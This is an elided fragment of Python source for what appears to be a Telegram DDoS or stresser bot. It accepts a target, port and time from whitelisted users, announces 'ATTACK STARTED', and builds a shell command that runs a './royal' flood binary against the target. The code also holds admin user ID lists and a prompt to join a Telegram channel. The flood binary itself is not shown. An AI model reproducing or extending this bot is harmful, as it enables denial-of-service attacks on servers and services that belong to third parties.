...
# Admin user IDs
admin_id = ["7769457936", "5166071266",     "5962383405"]
...
def log_command(user_id, target, port, time):
    admin_id = ["7769457936", "5962383405", "5166071266"]
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: https://t.me/neoblade1234"
    bot.reply_to(message, response)
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 300:
                ...
                full_command = f"./royal {target} {port} {time} 1200"
...
3. MAKE SURE YOU JOINED https://t.me/neoblade1234 OTHERWISE NOT WORK
